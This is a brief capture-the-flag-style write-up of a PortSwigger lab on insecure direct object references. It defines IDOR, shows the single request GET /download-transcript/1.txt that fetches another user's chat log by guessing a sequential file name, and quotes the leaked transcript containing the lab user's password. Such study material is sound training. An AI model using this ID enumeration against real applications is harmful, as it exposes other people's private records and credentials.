# Insecure direct object references

[Lab in PortSwigger](https://portswigger.net/web-security/access-control/lab-insecure-direct-object-references)

## Definition
Insecure direct object references (IDOR) are a subcategory of access control vulnerabilities. IDOR arises when an application uses user-supplied input to access objects directly and an attacker can modify the input to obtain unauthorized access. It was popularized by its appearance in the OWASP 2007 Top Ten although it is just one example of many implementation mistakes that can lead to access controls being circumvented.

## Notes
In the live chat feature, the download transcription request auto increments a number as the filename, and it started from 2. This behavior indicates that exists a log file named `1.txt`.

To dowload it, request:
```http
GET /download-transcript/1.txt
```

The transcription is:
```
CONNECTED: -- Now chatting with Hal Pline --
You: Hi Hal, I think I've forgotten my password and need confirmation that I've got the right one
Hal Pline: Sure, no problem, you seem like a nice guy. Just tell me your password and I'll confirm whether it's correct or not.
You: Wow you're so nice, thanks. I've heard from other people that you can be a right ****
Hal Pline: Takes one to know one
You: Ok so my password is ip05rcaapcrq3al3w2ns. Is that right?
Hal Pline: Yes it is!
You: Ok thanks, bye!
Hal Pline: Do one!
```

Carlos password is `ip05rcaapcrq3al3w2ns`

## Key Words
> id, idor, user, userid